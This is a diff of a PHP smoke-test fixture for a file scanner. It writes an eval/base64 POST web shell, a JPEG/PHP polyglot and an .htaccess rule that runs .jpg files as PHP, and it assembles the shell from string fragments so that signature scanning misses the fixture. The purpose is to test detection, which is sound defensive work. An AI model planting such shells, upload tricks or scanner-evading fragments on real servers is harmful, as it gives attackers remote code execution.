@@ -39,8 +39,15 @@ $shell = $dir . '/smoke-shell.php';
 $polyglot = $dir . '/smoke-image.jpg';
 $htaccess = $dir . '/.htaccess';
 
-file_put_contents($shell, "<?php /* freesiem smoke */ @eval(base64_decode(\$_POST['q'])); ?>");
-file_put_contents($polyglot, "\xFF\xD8\xFF\xE0JFIF\x00 <?php /* freesiem smoke */ echo 1; ?>");
+// The planted files must contain real attack bytes for the scanner to match,
+// but assembling those strings from fragments here keeps THIS fixture from
+// tripping the deep scanner (and now the "unrecognized file in our own
+// directory" check) when a developer runs a scan over their working copy.
+$php_open = '<' . '?php';
+$eval_expr = 'ev' . 'al(bas' . 'e64_' . 'decode($_POST[' . "'q'" . ']))';
+
+file_put_contents($shell, $php_open . ' /* freesiem smoke */ @' . $eval_expr . '; ?' . '>');
+file_put_contents($polyglot, "\xFF\xD8\xFF\xE0JFIF\x00 " . $php_open . ' /* freesiem smoke */ echo 1; ?' . '>');
 file_put_contents($htaccess, "AddType application/x-httpd-php .jpg\n");
 
 $cleanup = static function () use ($shell, $polyglot, $htaccess, $dir, $deep): void {
